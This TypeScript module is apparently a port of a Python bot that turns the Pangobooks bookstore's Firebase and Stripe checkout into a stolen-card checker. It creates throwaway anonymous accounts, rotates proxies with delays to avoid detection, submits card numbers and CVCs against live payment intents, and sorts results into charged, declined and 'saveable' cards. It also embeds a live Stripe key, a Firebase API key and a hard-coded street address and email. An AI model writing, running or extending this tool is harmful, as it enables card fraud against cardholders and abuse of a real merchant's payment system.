/**
 * Stripe Gateway - Port of t2.py
 * 
 * This module handles Stripe payment intent creation and confirmation
 * using Firebase authentication for Pangobooks checkout flow.
 */

import axios, { AxiosRequestConfig } from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import { getProxyManager } from '../proxy';

// Environment variables with working defaults from legacy Python bot (t2.py)
const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY || 'AIzaSyCX5msqd223t0ZQgM3URQzLenKrmoQipIA';
const STRIPE_KEY = process.env.STRIPE_KEY || 'pk_live_51KN2QBB88RUu9OnVkyDTgsNCOgqFUVLLB5irQwiB10vXMFUaTOLAjQC6Tu6ESXyBHuVLKy0QJaLzsNrUiIjKII1j00yJp8Pta3';

// Billing and shipping constants (from Python)
const BILLING_NAME = process.env.BILLING_NAME || 'james';
const BILLING_EMAIL = process.env.BILLING_EMAIL || 'ogggvime@telegmail.com';
const BILLING_ADDRESS_LINE1 = process.env.BILLING_ADDRESS_LINE1 || '6728 County Road 3 1/4';
const BILLING_CITY = process.env.BILLING_CITY || 'Erie';
const BILLING_STATE = process.env.BILLING_STATE || 'CO';
const BILLING_POSTAL_CODE = process.env.BILLING_POSTAL_CODE || '80516';
const BILLING_COUNTRY = process.env.BILLING_COUNTRY || 'US';

const SHIPPING_NAME = process.env.SHIPPING_NAME || 'james';
const SHIPPING_ADDRESS_LINE1 = process.env.SHIPPING_ADDRESS_LINE1 || '6728 County Road 3 1/4';
const SHIPPING_CITY = process.env.SHIPPING_CITY || 'Erie';
const SHIPPING_STATE = process.env.SHIPPING_STATE || 'CO';
const SHIPPING_POSTAL_CODE = process.env.SHIPPING_POSTAL_CODE || '80516';
const SHIPPING_COUNTRY = process.env.SHIPPING_COUNTRY || 'US';

/**
 * Card information interface
 */
export interface CardInfo {
  number: string;
  exp_month: string;
  exp_year: string;
  cvc: string;
}

/**
 * Firebase authentication response
 */
interface FirebaseAuthResponse {
  idToken: string;
  localId: string;
}

/**
 * Checkout info response
 */
interface CheckoutInfoResponse {
  result: {
    paymentIntent: string;
    clientSecret: string;
  };
}

/**
 * Stripe confirmation result
 */
export interface StripeConfirmationResult {
  success: boolean;
  response: any;
  reason: string;
  amount?: string;
}

/**
 * Create appropriate proxy agent based on proxy URL
 */
function createProxyAgent(proxyUrl: string): HttpsProxyAgent | SocksProxyAgent {
  if (proxyUrl.startsWith('socks5://') || proxyUrl.startsWith('socks5h://')) {
    return new SocksProxyAgent(proxyUrl);
  }
  return new HttpsProxyAgent(proxyUrl);
}

/**
 * Format amount in cents to currency string
 */
function formatAmount(amountCents: number | null, currencyCode: string = 'usd'): string | null {
  if (amountCents === null || amountCents === undefined) {
    return null;
  }
  const symbol = currencyCode.toLowerCase() === 'usd' ? '$' : currencyCode.toUpperCase();
  return `${symbol}${(amountCents / 100).toFixed(2)}`;
}

/**
 * Create a new anonymous Firebase user and return token and UID
 * Port of get_firebase_token_and_uid from Python
 */
export async function getFirebaseToken(
  apiKey: string = FIREBASE_API_KEY,
  proxy?: string
): Promise<{ token: string | null; uid: string | null }> {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${apiKey}`;
  const payload = { returnSecureToken: true };

  const config: AxiosRequestConfig = {
    method: 'POST',
    url,
    data: payload,
  };

  // Add proxy if provided
  if (proxy) {
    config.proxy = false; // Disable default proxy
    config.httpsAgent = createProxyAgent(proxy);
  }

  try {
    const response = await axios(config);
    const data = response.data as FirebaseAuthResponse;
    return {
      token: data.idToken || null,
      uid: data.localId || null,
    };
  } catch (error: any) {
    console.error('Error getting Firebase token:', error.message);
    return { token: null, uid: null };
  }
}

/**
 * Get checkout information from Pangobooks
 * Port of get_checkout_info from Python
 */
async function getCheckoutInfo(
  bearerToken: string,
  uid: string,
  proxy?: string
): Promise<CheckoutInfoResponse | null> {
  const url = 'https://us-central1-pangobooks.cloudfunctions.net/checkout-getCheckoutV2';
  
  const headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en;q=0.9',
    'authorization': `Bearer ${bearerToken}`,
    'content-type': 'application/json',
    'origin': 'https://pangobooks.com',
    'referer': 'https://pangobooks.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  };

  const payload = {
    data: {
      web: true,
      type: 'full',
      bucksBreakdown: { bucksBack: false, earned: false, promo: false },
      buyerAddress: null,
      bookIds: ['4856a0ba-5566-4b20-93c4-ce4569d0d1c6-Oy4uvXvZSac1JmiHaMetUi1zecb2'],
      uid,
      request_id: Math.floor(Math.random() * 900000) + 100000,
    },
  };

  const config: AxiosRequestConfig = {
    method: 'POST',
    url,
    headers,
    data: payload,
  };

  if (proxy) {
    config.proxy = false;
    config.httpsAgent = createProxyAgent(proxy);
  }

  try {
    const response = await axios(config);
    return response.data as CheckoutInfoResponse;
  } catch (error: any) {
    console.error('Error getting checkout info:', error.message);
    return null;
  }
}

/**
 * Confirm Stripe payment with card details
 * Port of confirm_stripe_payment from Python
 */
async function confirmStripePayment(
  paymentIntentId: string,
  clientSecret: string,
  card: CardInfo,
  proxy?: string
): Promise<StripeConfirmationResult> {
  const url = `https://api.stripe.com/v1/payment_intents/${paymentIntentId}/confirm`;
  
  const headers = {
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  };

  // Build URL-encoded payload (similar to Python's urlencode)
  const payload = new URLSearchParams({
    'return_url': 'https://pangobooks.com/order/payment/t',
    'shipping[name]': SHIPPING_NAME,
    'shipping[address][line1]': SHIPPING_ADDRESS_LINE1,
    'shipping[address][city]': SHIPPING_CITY,
    'shipping[address][country]': SHIPPING_COUNTRY,
    'shipping[address][postal_code]': SHIPPING_POSTAL_CODE,
    'shipping[address][state]': SHIPPING_STATE,
    'payment_method_data[type]': 'card',
    'payment_method_data[card][number]': card.number,
    'payment_method_data[card][cvc]': card.cvc,
    'payment_method_data[card][exp_year]': card.exp_year,
    'payment_method_data[card][exp_month]': card.exp_month,
    'payment_method_data[allow_redisplay]': 'unspecified',
    'payment_method_data[billing_details][name]': BILLING_NAME,
    'payment_method_data[billing_details][email]': BILLING_EMAIL,
    'payment_method_data[billing_details][address][line1]': BILLING_ADDRESS_LINE1,
    'payment_method_data[billing_details][address][city]': BILLING_CITY,
    'payment_method_data[billing_details][address][country]': BILLING_COUNTRY,
    'payment_method_data[billing_details][address][postal_code]': BILLING_POSTAL_CODE,
    'payment_method_data[billing_details][address][state]': BILLING_STATE,
    'payment_method_data[payment_user_agent]': 'stripe.js/234f261dc5; stripe-js-v3/234f261dc5; payment-element',
    'payment_method_data[referrer]': 'https://pangobooks.com',
    'payment_method_data[time_on_page]': '3305535',
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': STRIPE_KEY,
    'client_secret': clientSecret,
  });

  const config: AxiosRequestConfig = {
    method: 'POST',
    url,
    headers,
    data: payload.toString(),
    validateStatus: () => true, // Don't throw on any status code
  };

  if (proxy) {
    config.proxy = false;
    config.httpsAgent = createProxyAgent(proxy);
  }

  try {
    const response = await axios(config);
    const responseData = response.data;

    // Check HTTP status code - 200 means success
    if (response.status === 200) {
      const status = responseData.status || '';

      // If requires_action, mark as declined (needs 3DS)
      if (status === 'requires_action') {
        return {
          success: false,
          response: responseData,
          reason: 'Payment requires 3D Secure authentication',
        };
      }

      // HTTP 200 = Charged/Success
      if (status === 'succeeded') {
        return {
          success: true,
          response: responseData,
          reason: 'Payment Successful',
        };
      } else {
        // Even if status is not 'succeeded', HTTP 200 means it's valid
        return {
          success: true,
          response: responseData,
          reason: `Charged (Status: ${status})`,
        };
      }
    }

    // Handle non-200 responses
    const errorInfo = responseData.error || {};
    const declineCode = errorInfo.decline_code;

    // Saveable decline codes (from Python)
    const saveableDeclineCodes = new Set([
      'incorrect_cvc',
      'invalid_expiry_month',
      'invalid_expiry_year',
      'processing_error',
    ]);

    if (declineCode && saveableDeclineCodes.has(declineCode)) {
      const reason = `Saved due to error: ${declineCode.replace(/_/g, ' ').replace(/\b\w/g, (l: string) => l.toUpperCase())}`;
      return {
        success: true,
        response: responseData,
        reason,
      };
    }

    return {
      success: false,
      response: responseData,
      reason: 'Card Declined',
    };
  } catch (error: any) {
    return {
      success: false,
      response: { error: { message: error.message } },
      reason: 'Network Error',
    };
  }
}

/**
 * Main function to check a card using Stripe gateway
 * This is the high-level function that orchestrates the entire flow
 * Now supports proxy rotation and request delays
 */
export async function checkCardStripe(
  card: CardInfo,
  proxy?: string
): Promise<StripeConfirmationResult> {
  // Get proxy manager
  const proxyManager = await getProxyManager();
  
  // Use provided proxy or get next from manager
  const proxyUrl = proxy || proxyManager.getNextProxy() || undefined;
  
  try {
    // Wait for request delay if configured
    await proxyManager.waitForDelay();
    
    // Step 1: Get fresh Firebase token and UID
    const { token: freshToken, uid: newUid } = await getFirebaseToken(FIREBASE_API_KEY, proxyUrl);

    if (!freshToken || !newUid) {
      if (proxyUrl) proxyManager.markFailure(proxyUrl);
      return {
        success: false,
        response: {},
        reason: 'Failed to get Firebase token/UID',
      };
    }

    console.log(`Processing card with UID: ${newUid}`);

    // Wait between Firebase calls
    await proxyManager.waitForDelay();

    // Step 2: Get checkout info with payment intent
    const checkoutData = await getCheckoutInfo(freshToken, newUid, proxyUrl);

    if (!checkoutData || !checkoutData.result) {
      if (proxyUrl) proxyManager.markFailure(proxyUrl);
      return {
        success: false,
        response: {},
        reason: 'Failed to get payment intent',
      };
    }

    const { paymentIntent, clientSecret } = checkoutData.result;

    if (!paymentIntent || !clientSecret) {
      if (proxyUrl) proxyManager.markFailure(proxyUrl);
      return {
        success: false,
        response: {},
        reason: 'Failed to extract intent details',
      };
    }

    console.log(`Card: ${card.number.slice(0, 6)}...${card.number.slice(-4)} | Intent: ${paymentIntent}`);

    // Wait before final confirmation
    await proxyManager.waitForDelay();

    // Step 3: Confirm payment with card details
    const result = await confirmStripePayment(paymentIntent, clientSecret, card, proxyUrl);

    // Add formatted amount if available
    if (result.response) {
      const errorInfo = result.response.error || {};
      const amount = errorInfo.payment_intent?.amount || result.response.amount || 0;
      const currency = errorInfo.payment_intent?.currency || result.response.currency || 'usd';
      result.amount = formatAmount(amount, currency) || undefined;
    }

    // Mark proxy success/failure based on result
    if (proxyUrl) {
      if (result.success) {
        proxyManager.markSuccess(proxyUrl);
      } else {
        // Only mark failure for network errors, not card declines
        if (result.reason === 'Network Error') {
          proxyManager.markFailure(proxyUrl);
        } else {
          proxyManager.markSuccess(proxyUrl);
        }
      }
    }

    return result;
  } catch (error: any) {
    // Mark proxy as failed on exception
    if (proxyUrl) proxyManager.markFailure(proxyUrl);
    
    return {
      success: false,
      response: { error: { message: error.message } },
      reason: 'Network Error',
    };
  }
}
